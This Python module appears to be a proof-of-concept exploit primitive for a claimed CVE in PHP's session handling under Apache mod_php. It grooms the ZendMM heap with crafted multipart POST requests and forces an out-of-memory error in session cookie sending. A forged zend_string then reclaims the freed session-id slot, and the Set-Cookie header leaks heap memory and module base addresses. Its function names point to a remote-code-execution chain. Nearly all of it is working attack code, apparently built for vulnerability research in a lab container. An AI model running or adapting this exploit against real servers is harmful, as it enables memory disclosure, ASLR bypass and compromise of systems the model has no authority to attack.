#!/usr/bin/env python3
# INDEX: heap-window forward over-read via set-cookie | apache | multi-request, fresh worker
"""apache_cookie_window_leak.py - zero-knowledge heap-window disclosure
(CVE-2026-109619, Apache mod_php).

Two paired requests on a fresh worker. R1 OOMs inside php_session_send_cookie
just after creating the session id, leaving the created-sid zend_string dangling
on the b320 free-list. R2 reclaims that slot with a fake zend_string whose len is
an attacker-chosen `window`, so the session layer reflects `window` heap bytes
past the slot in the Set-Cookie PHPSESSID. It is a bounded FORWARD over-read (the
length is controlled, not the address): it recovers the ZendMM request-heap chunk
base and, when libphp sits adjacent, the module base, and saves the raw window to
poc/cookie-window.bin. Needs --service (the groom is pinned to the in-container curl
client) and the session cookie INI. Proven on php:8.4.26-apache (mod_php, 16M).

This is the builder primitive; the runnable disclosure driver is
chains/apache_cookie_disclose.py.
"""
from __future__ import annotations

import os
import subprocess
import sys
import tempfile

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.docker_compose import docker_cp  # noqa: E402
from common.http_urllib import curl  # noqa: E402
from common.multipart import part_tuple as part, PHP2SHELL_BOUNDARY as BOUNDARY  # noqa: E402
from primitives.encode.zend_string_forge import pack_zend_string  # noqa: E402
from primitives.read_leak.leak_parsers import (  # noqa: E402
    classify_cookie, cookie_from_headers)


COOKIE_RCE_LIMIT = 16 * 1024 * 1024      # the lab memory_limit (= exactly 8 ZendMM
                                 # chunks, so the 9th chunk carve always OOMs)
COOKIE_RCE_SPRAY_VAL = 280               # spray value size (string+buffer both b320)
COOKIE_RCE_WINDOW = 4096                # default disclosure window (fake ZSTR_LEN;
                                 # R2's e_id = 3*window must fit its free pages)
COOKIE_RCE_BULK = 392                    # 16-KiB bulk fill fields (2 x 5 pages kept
                                 # per field: the value's two zend_strings)
COOKIE_RCE_TAIL = [(3000, "t1"), (1500, "t2"), (600, "t3"), (256, "t4")]
# ^ first-use bin groups carved before the tune ladder; t4=256 is the b320
#   group whose slot 1 (the freed raw buffer, LIFO free-list reuse) is
#   exactly where the created sid lands in R1 - and the spray's raw buffers
#   in R2.
COOKIE_RCE_TAIL2 = [(100, "t5"), (40, "t6"), (30, "t7"), (15, "t8"), (15, "t9")]
# ^ binned tail after the tune ladder: b128/b48/b40/b16 group carves; t8/t9's
#   40-byte strings are live b40 allocations in both requests (see COOKIE_RCE_PAD40).
COOKIE_RCE_PAD40 = 86
# ^ extra 15-byte fields ("a"*) whose registered copies are live b40 strings.
#   gdb ground truth: R1's request startup carves its first b40 SRUN page one
#   page later than R2's (the worker's module init left a live b16 page in the
#   main chunk that R1's request sees, and the post-R1 zend_mm_shutdown reset
#   clears), so the stale R1 ps_files/basedir slots (the first b40 page)
#   would point into R2's 16-page VM-stack run: ps_close_files' release of the
#   stale basedir does GC_DELREF (the leftover refcount is 1) and the efree of
#   a mid-LRUN pointer panics ("zend_mm_heap corrupted", abort, container
#   death). With ~86 extra fields the b40 chain spills into a SECOND b40 page
#   in both requests - carved at the identical fill position (both run the
#   same prefix and the pad sits before R1's tune ladder) - so the stale
#   slots land in a live R2 b40 page: the dance releases/frees valid R2
#   allocations and the cleanup survives.
COOKIE_RCE_R1_ENDPATH = 1      # see cookie_rce_r1_parts; 1 routes R1 through END cleanup
                       # (the proven self-dance config, with the cookie_rce_shot warmup)
COOKIE_RCE_R1_B40PAD = 0       # R1-only extra b40 fields (nested y[i], 15B
#   -> b40 copies) appended post-t4 in cookie_rce_r1_parts to shift R1's END-path
#   llist-clean ps_files slot DOWN toward R2's fixed 02028 (close the
#   delta=-4096 to 0 = SELF-DANCE). R1-only, so it does not move R2's slot.
COOKIE_RCE_R2_PRESSURE = 0     # R2-only fine pressure: a nested
#   pr[i] array of 100-byte (b128) retained copies - a bin NOT used by the
#   b40/b320 grooms, so it tunes R2's total memory WITHOUT disturbing the
#   self-dance. Goal: land the OOM in the span AFTER send_cookie completes
#   (cookie already in SG headers) but BEFORE s_read's ps_files_open release
#   of the freed basedir slot -> clean bailout carrying the Set-Cookie leak.
#   128-byte granularity; sweep vs window.
COOKIE_RCE_LONGNAME_TAIL = 0   # see cookie_rce_r2_parts; 0 disables
COOKIE_RCE_SELFDANCE_TAIL = 0  # b40 tail-drain; not needed once the warmup+
                       # R1_ENDPATH alignment lands fresh==stale directly
# ^ trailing LIVE 15-byte $_POST fields ("z"*) appended AFTER the dup40
#   pair - each registers a 15-char value copy (24+15+1=40 -> b40) that is
#   retained, so it POPS one b40 slot off the free-list head as a live
#   allocation. gdb ground truth (window=256): at the END->s_open ecalloc the
#   b40 free list is  02028(head,page-1 header-line cycle) -> 66ca8 -> 66cf8 ->
#   66d20 -> 66d48 -> 66d70 -> 66d98(STALE R1 ps_files, index 6) -> ...  The
#   fresh ps_files ecalloc pops the head (02028), so ps_close_files runs on the
#   STALE free slot: last_key=+0=free-list next-ptr (survives a bogus DELREF),
#   basedir=+8=leftover 'B' bulk bytes 0x4242.. -> release SEGV. Draining K live
#   b40 allocs off the head advances it toward the stale slot; at the right K
#   the ecalloc pops STALE itself (the self-dance): then ps_close_files reads
#   the just-zeroed fresh struct (last_key=0 skip, basedir=valid fresh
#   "/tmp/sess", fd=-1 skip) and the worker survives through reset_id/
#   send_cookie (the leak). K is swept empirically against the self-dance.
COOKIE_RCE_SPRAY_PRIME = 3
# ^ primer fields ("p"*, plain filler values, raw+copy both b320) ahead of the
#   dup pair in R2: each primer's registered copy advances the b320 copy chain
#   one slot, so with the right count the dup-pair's first copy lands exactly
#   on the stale created-sid slot (R1's sid = the b320 group's slot 6: the
#   $_POST 8-bucket arData carve, t4's raw+copy, the $_COOKIE arData and the
#   FILE_START's progress HashTables precede it); the second "dup" field
#   (same name) replaces the first's $_POST value, releasing that copy and
#   pushing the sid slot back to the b320 free-list head - every spray field's
#   RAW buffer (the planted fake zend_string) is then popped from the sid slot
#   itself, giving ZSTR_LEN(PS(id)) = the fake's len (the window) instead of
#   a registered copy's small real length.
COOKIE_RCE_TUNE_LADDER = [4072, 4072, 4072]  # fixed page-run fields (4 pages retained
                                   # each); the swept tune field finishes the
                                   # fill down to 0-1 free pages
COOKIE_RCE_TUNE_DEFAULT = 4072          # the swept last tune field: 2 pages of
                               # strings per 2048 bytes of value; R1's
                               # target leaves 0-1 free pages so e_id's b800
                               # group carve OOMs inside php_session_send_
                               # cookie (the signature: "tried to allocate
                               # 8192 bytes in Unknown on line 0")
COOKIE_RCE_PARITY_VAL = 200             # an optional extra field whose zend_string
                               # (225 -> the b224 group, 1 page) flips the
                               # free-page parity when the 2-page-granular
                               # tune knob cannot


def cookie_rce_prefix_parts(nbulk=COOKIE_RCE_BULK):
    """The bulk chunk-fill + the pre-tune tail, replayed byte-identically by
    R1 and R2 (only the tune ladder and the ending differ)."""
    parts = [part(f"h{i}", b"B" * 16384) for i in range(nbulk)]
    parts += [part(n, b"T" * v) for v, n in COOKIE_RCE_TAIL]
    return parts


def cookie_rce_pad40_parts(npad=COOKIE_RCE_PAD40):
    """The extra live b40 fields ("a"*) - see COOKIE_RCE_PAD40. In R1 they sit before
    the tune ladder, in R2 before the binned tail, so both requests' b40
    chains spill into a second b40 page carved at the identical fill."""
    return [part(f"a{i}", b"T" * 15) for i in range(npad)]


def cookie_rce_r1_parts(tune, nbulk=COOKIE_RCE_BULK, parity=False, npad=COOKIE_RCE_PAD40):
    parts = cookie_rce_prefix_parts(nbulk)
    parts += cookie_rce_pad40_parts(npad)
    for i, t in enumerate(COOKIE_RCE_TUNE_LADDER):
        parts.append(part(f"u{i}", b"U" * t))
    parts.append(part("tune", b"U" * tune))
    if parity:
        parts.append(part("p0", b"P" * COOKIE_RCE_PARITY_VAL))
    parts += [part(n, b"T" * v) for v, n in COOKIE_RCE_TAIL2]
    # R1-only b40 pad (nested array so R1's $_POST gains 1 bucket):
    # shifts R1's END-path llist-clean ps_files slot to align with R2's 02028.
    for i in range(COOKIE_RCE_R1_B40PAD):
        parts.append(part(f"y[{i}]", b"T" * 15))
    parts.append(part("PHP_SESSION_UPLOAD_PROGRESS", "k"))
    if not COOKIE_RCE_R1_ENDPATH:
        parts.append(part("victim", b"V" * 8, filename="victim.bin",
                          ctype="text/plain"))
    # COOKIE_RCE_R1_ENDPATH: when set, R1 omits the file part so its session
    # init (create-sid + send_cookie + e_id OOM) happens at MULTIPART_EVENT_END
    # cleanup - the SAME path R2 uses - instead of FILE_START. Both requests
    # then ecalloc their ps_files when the b40 free-list head is the page-1
    # header-llist-node slot (0x02028, re-pushed by fileupload_done's
    # zend_llist_clean right before END - a fixed 40-byte node, independent of
    # field names, hence the "unbreakable" head). So R1's ps_files (-> R2's
    # STALE mod_data) and R2's fresh s_open ps_files land on the SAME slot:
    # the self-dance. ps_close_files then runs on R2's just-zeroed fresh
    # struct (last_key=0 skip, basedir=valid fresh "/tmp/sess") and survives.
    return parts


def cookie_rce_r2_parts(nspray, window=COOKIE_RCE_WINDOW, nbulk=COOKIE_RCE_BULK, npad=COOKIE_RCE_PAD40,
                nprime=COOKIE_RCE_SPRAY_PRIME, pressure=COOKIE_RCE_R2_PRESSURE):
    """R2 replays the bulk + t1..t4 + the pad (the b320/b40 groups carve at the
    same addresses), skips the tune ladder (R2 needs its pages for the END
    chain: e_id = 3*window, smart_str, estrndup, track_init), mirrors R1's
    t8/t9 tail plus t10 (R1's victim-file part allocates extra b40 strings
    ("victim.bin" et al.) that R2 must balance so both b40 chains stay deep
    inside the second b40 page), then aligns the spray over the stale sid:
    nprime primer fields advance the b320 copy chain so the dup-pair's first
    registered copy lands exactly on the stale created-sid slot; the second
    dup registration releases the first's copy (a $_POST replace), pushing
    that slot back to the b320 free-list head - so every spray field's RAW
    buffer (the fake zend_string, planted bytes, not a PHP-string header) is
    popped from the sid slot itself: ZSTR_LEN(PS(id)) = the fake len (the
    disclosure window) and ZSTR_VAL = the planted "SSSS\\0" prefix plus the
    heap past the raw buffer. No file part - MULTIPART_EVENT_END runs the
    stale-state cleanup instead of a FILE_START session init."""
    parts = cookie_rce_prefix_parts(nbulk)
    parts += cookie_rce_pad40_parts(npad)
    parts += [part(n, b"T" * v) for v, n in COOKIE_RCE_TAIL2]
    parts.append(part("t10", b"T" * 15))
    parts.append(part("PHP_SESSION_UPLOAD_PROGRESS", "k"))
    fake = cookie_rce_fake_string(window)
    for i in range(nprime):
        parts.append(part(f"p{i}", b"P" * COOKIE_RCE_SPRAY_VAL))
    # the b320 dup pair: the second registration releases the first's copy
    # (a $_POST replace), pushing the stale sid slot back to the b320
    # free-list head so the spray fields' RAW buffers (the fake zend_string)
    # are popped from the sid slot itself: ZSTR_LEN(PS(id)) = the fake's
    # len (the disclosure window) instead of a registered copy's real len.
    parts.append(part("dup", fake))
    parts.append(part("dup", fake))
    # the b40 dup pair (LAST fields - after the spray, so their free is the
    # final b40 free before MULTIPART_EVENT_END): the second registration
    # releases the first's copy, pushing that slot back to the b40 free-list
    # head - the dance's ps_files ecalloc then pops the very slot R1's
    # ps_files occupied (the self-dance: stale == fresh data, fd=-1 /
    # last_key=NULL / the fresh basedir).
    for i in range(nspray):
        parts.append(part(f"g{i}", fake))
    parts.append(part("dup40", b"T" * 15))
    parts.append(part("dup40", b"T" * 15))
    # self-dance tail drain: K trailing LIVE 15-byte values whose zend_
    # string copies pop b40 slots off the free-list head, advancing it to the
    # STALE ps_files slot so the END->s_open ecalloc reclaims it (self-dance).
    # They are registered as ONE nested array ("z[i]"), so the top-level $_POST
    # HashTable gains a single bucket (nNumUsed stays under the 512->1024 growth
    # threshold whose 40960-byte realloc would OOM the page-starved R2 worker),
    # while each element is a retained 15-char (b40) copy that drains one slot.
    # These are post-t4 (after the b320 group carve), so they do not move it.
    # See COOKIE_RCE_SELFDANCE_TAIL; K is a module global so the sweep can vary it.
    for i in range(COOKIE_RCE_SELFDANCE_TAIL):
        parts.append(part(f"z[{i}]", b"T" * 15))
    # Optional final part with a LONG name, so its
    # Content-Disposition header-line estrndup is not a b40 allocation and does
    # not re-push the page-1 s1 slot as the b40 free-list head at END. Tests
    # whether the "unbreakable" header-line cycle that pins the s_open ecalloc
    # head can be deflected. COOKIE_RCE_LONGNAME_TAIL = name length (0 disables).
    if COOKIE_RCE_LONGNAME_TAIL:
        parts.append(part("q" * COOKIE_RCE_LONGNAME_TAIL, b"T" * 15))
    # fine R2 pressure: nested pr[] of 100-byte (b128)
    # retained copies, one $_POST bucket. Tunes R2's memory so the OOM lands
    # in the post-send_cookie / pre-s_read span (clean bailout WITH the cookie)
    # instead of at the poisoning ps_files_open release. b128 != b40/b320, so
    # the self-dance groom is untouched.
    for i in range(pressure):
        parts.append(part(f"pr[{i}]", b"T" * 100))
    return parts


def cookie_rce_fake_string(window):
    """The fake zend_string planted over the stale created-sid slot:
    gc = (refcount 0x40000000, type_info GC_STRING), h = 0,
    len = window, val = "SSSS\\0" + 's' filler (the NUL-terminated valid-sid
    prefix keeps php_session_valid_key/ps_files_path_create happy)."""
    v = bytearray(b"s" * COOKIE_RCE_SPRAY_VAL)
    # gc(refcount 0x40000000, GC_STRING), h=0, len=window
    pack_zend_string(v, 0, window, refcount=0x40000000)
    v[24:30] = b"SSSS\x00ss"                         # val prefix
    return bytes(v)


COOKIE_RCE_LC_HDR_OFF = 0x5500   # measured value-offset of PS(id) inside the carrier
COOKIE_RCE_LC_FAKE_RC = 0        # forged refcount: GC_DELREF underflows -> never freed
COOKIE_RCE_LC_PAGES = 300        # carrier size in 4K pages (>= (hdr_off+window)/4096)


# cookie_rce_live_carrier_value is an alternative reclaim (one large live $_POST
# value with the fake header planted in its interior); the disclosure above uses
# the b320 free-list reclaim (cookie_rce_fake_string + the R2 dup pair) instead.
def cookie_rce_live_carrier_value(pages=COOKIE_RCE_LC_PAGES, hdr_off=COOKIE_RCE_LC_HDR_OFF,
                          window=0xC8000, fake_rc=COOKIE_RCE_LC_FAKE_RC,
                          data=b"/02BBBB"):
    """A large LIVE $_POST string value ('A' fill) with a forged zend_string
    header planted at `hdr_off` so it overlays the dangling PS(id).  gc has a
    forged refcount (default 0 -> rshutdown's zend_string_release GC_DELREF
    underflows to 0xFFFFFFFF, never frees), type_info 0x16, len = `window`
    (the OOB-read size), and data[0]=='/' so php_session_valid_key FAILS
    cleanly (the 9bie survival path).  `data` is NUL-free, first byte '/'."""
    L = pages * 4096 - 25
    v = bytearray(b"A" * L)
    # refcount (forged), type_info IS_STRING, h=0, len = OOB window,
    # data[0]='/' -> valid_key fail
    pack_zend_string(v, hdr_off, window, refcount=fake_rc, val=data)
    return bytes(v)


def cookie_rce_serialize(parts):
    chunks = []
    for hdrs, body in parts:
        chunks.append(f"--{BOUNDARY}\r\n{hdrs}\r\n\r\n".encode())
        chunks.append(body if isinstance(body, bytes) else body.encode())
        chunks.append(b"\r\n")
    chunks.append(f"--{BOUNDARY}--\r\n".encode())
    return b"".join(chunks)


def cookie_rce_send(service, base, body_bytes, path, timeout=90):
    """POST a raw multipart body via the pinned in-container curl (the client
    header set shifts the target layout); returns (status_line, headers,
    body)."""
    p = f"/tmp/apache_cookie_window_leak-{path}.bin"
    with tempfile.NamedTemporaryFile(prefix="apache_cookie_window_leak-", delete=False) as f:
        f.write(body_bytes)
        tmp = f.name
    try:
        docker_cp(tmp, f"{service}:{p}")
    finally:
        os.unlink(tmp)
    hdr = f"/tmp/apache_cookie_window_leak-{path}.hdr"
    out = curl(["-s", "-m", str(timeout), "-D", hdr,
               "-H", "Expect:",
               "-H", "Cookie: PHPSESSID=",
               "-H", f"Content-Type: multipart/form-data; boundary={BOUNDARY}",
               "--data-binary", f"@{p}", f"{base}/poc.php"],
              timeout=timeout, service=service)
    rh = subprocess.run(["docker", "compose", "exec", "-T", service,
                         "cat", hdr], capture_output=True)
    return rh.stdout, out


def cookie_rce_warmup_parts():
    """A benign small multipart (no file, no session fields, clean 200)
    sent as request #0 so R1 becomes request #2 and R2 request #3. The b40
    page the s_open ecalloc lands on differs by exactly one page between the
    FIRST request on a worker and every later one (per-request STARTUP RESIDUE,
    not body structure). Without the warmup R1 (req #1) dangles ps_files one
    page above R2's fresh (req #2) - delta -4096, SELF-DANCE=0. With it, R1 and
    R2 are both steady-state (#2/#3), their ps_files slots coincide and the
    self-dance fires (gdb: SELF-DANCE=1, delta=0)."""
    return [part(f"w{i}", b"x" * 8) for i in range(4)]


def cookie_rce_shot(service, base, tune, nspray, window=COOKIE_RCE_WINDOW, bulk=COOKIE_RCE_BULK,
            parity=False, npad=COOKIE_RCE_PAD40, nprime=COOKIE_RCE_SPRAY_PRIME,
            pressure=COOKIE_RCE_R2_PRESSURE):
    """One R1(tune)+R2 pair on a fresh worker, preceded by a warmup (request #0)
    so R1/R2 run steady-state and align for the self-dance. Returns (r1_hdr,
    r2_hdr, r2_body, cookie, verdict)."""
    cookie_rce_send(service, base, cookie_rce_serialize(cookie_rce_warmup_parts()), "warm")
    r1h, _ = cookie_rce_send(service, base,
                     cookie_rce_serialize(cookie_rce_r1_parts(tune, bulk, parity, npad)), "r1")
    r2h, r2b = cookie_rce_send(service, base,
                       cookie_rce_serialize(cookie_rce_r2_parts(nspray, window, bulk, npad,
                                               nprime, pressure)), "r2")
    cookie = cookie_from_headers(r2h)
    verdict, ck = classify_cookie(cookie)
    return r1h, r2h, r2b, cookie, verdict
